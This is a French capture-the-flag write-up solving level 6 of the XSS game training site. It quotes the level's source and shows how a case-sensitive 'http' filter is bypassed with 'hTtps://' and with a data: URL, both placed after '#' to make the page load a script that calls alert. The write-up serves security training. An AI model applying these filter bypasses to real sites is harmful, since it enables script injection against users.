## NIVEAU 6 - [FOLLOW THE 🐇](https://xss-game.appspot.com/level6)

### DESCRIPTION DE LA MISSION

<pre>
Les applications web complexes ont parfois la capacité de charger dynamiquement des bibliothèques JavaScript en fonction
de la valeur de leurs paramètres URL ou d'une partie de location.hash.

Il est très difficile de bien faire les choses: permettre à l'utilisateur d'influencer l'URL lors du chargement de
scripts ou d'autres types de données potentiellement dangereuses telles que XMLHttpRequest conduit souvent à de
graves vulnérabilités.
</pre>

<br>

### OBJECTIF DE LA MISSION

<pre>
Trouver un moyen de faire en sorte que l'application demande un fichier externe qui provoquera l'exécution d'une alert.
</pre>

<br>

### INDICES

**Premier indice**:
> [!TIP]
> <pre>
> 1. See how the value of the location fragment (after #) influences the URL of the loaded script.
> 1. Voyez comment la valeur du fragment location (après #) influence l'URL du script chargé.
> </pre>

C'est donc après le `#` de l'URL que nous allons ajouter notre playload puisqu'il semble que ce soit cette partie là qui agisse sur le comportement de l'URL.

**Deuxième indice**:
> [!TIP]
> <pre>
> 2. Is the security check on the gadget URL really foolproof?
> 2. Le contrôle de sécurité de l'URL du gadget est-il vraiment infaillible ?
> </pre>

Autrement dit: Est-ce que le système de sécurité de l'URL interdit l'injection de payload ?

**Troisième indice**:
> [!TIP]
> <pre>
> 3. Sometimes when I'm frustrated, I feel like screaming...
> 3. Parfois, lorsque je suis frustré, j'ai envie de crier...
> </pre>

J'avoue ne pas avoir compris cet indice   -_-'

**Quatrième indice**:
> [!TIP]
> 4. If you can't easily host your own evil JS file, see if google.com/jsapi?callback=foo will help you here.
> 4. Si vous ne pouvez pas héberger facilement votre propre fichier JS maléfique, voyez si google.com/jsapi?callback=foo
> peut vous aider.
> </pre>

Nous n'utiliserons pas Google mais ce payload: `https://payload.jh123x.com/alert.js`.

<br>

### MISSION

Commençons par regarder les codes-sources, comme d'habitude.
<br>Les fichiers `.py` et `js` ne nous apprennent rien d'utile, en revanche, le fichier `index.html` est un peu plus loquace, plus précisément, à partir de la ligne `20`:

```html
1   <!doctype html>
2   <html>
3     <head>
4       <!-- Internal game scripts/styles, mostly boring stuff -->
5       <script src="/static/game-frame.js"></script>
6       <link rel="stylesheet" href="/static/game-frame-styles.css" />
7 
8       [...]
19 
20        // This will totally prevent us from loading evil URLs!
21        if (url.match(/^https?:\/\//)) {
22          setInnerText(document.getElementById("log"),
23            "Sorry, cannot load a URL containing \"http\".");
24          return;
25        }
26 
58      [...]
59 
60    <body id="level6">
61      <img src="/static/logos/level6.png">
62      <img id="cube" src="/static/level6_cube.png">
63      <div id="log">Loading gadget...</div>
64    </body>
65  </html>
```

Commentaires des développeurs:

```
// Cela nous empêchera totalement de charger des URL malveillantes !
```

Leur but est, manifestement, d'interdire toutes les adresses commençant par `http` ou `https` à l'aide de cette fonction de contrôle des URLs.

<div align="center">
    <img
        src="https://github.com/AyckinnLisa/xss_game/blob/main/appspot_com/niveau_6/img/https_try.png"
        style="width:100%">
</div>

Comme nous pouvons le voir, l'URL du payload est refusée.
<br>Ce qui se veut être une bonne idée, sur le principe, MAIS... Une faille va nous permettre de contourner cette "sécurité".

<br>En effet, ce système est sensible à la casse, ce qui signifie qu'il nous est possible de simplement mettre une lettre en majuscule, par exemple, `hTtps` pour que le playload fonctionne.

```
https://xss-game.appspot.com/level6/frame#hTtps://payload.jh123x.com/alert.js
```

<br>

> [!IMPORTANT]
> <pre>
> Congratulations, you executed an alert:
>
> undefined
>
> You can now advance to the next level.
> </pre>

<br>

> [!TIP]
> Une autre possibilité aurait été d'injecter une donnée URL:
> ```javascript
> data:text/plain,alert('ACCES AUTORISE !')
> ```

```
https://xss-game.appspot.com/level6/frame#data:text/plain,alert('ACCES AUTORISE !')
```

<br>

> [!IMPORTANT]
> <pre>
> Congratulations, you executed an alert:
>
> ACCES AUTORISE !
>
> You can now advance to the next level.
> </pre>

<br>

> [!NOTE]
> **BRAVO, VOUS VENEZ DE TERMINER LA SÉRIE DE DÉFIS DE CE SITE !**

<br>

<div align="center">
    <img
        src="https://github.com/AyckinnLisa/xss_game/blob/main/appspot_com/niveau_6/img/complete.png"
        style="width:100%">
</div>
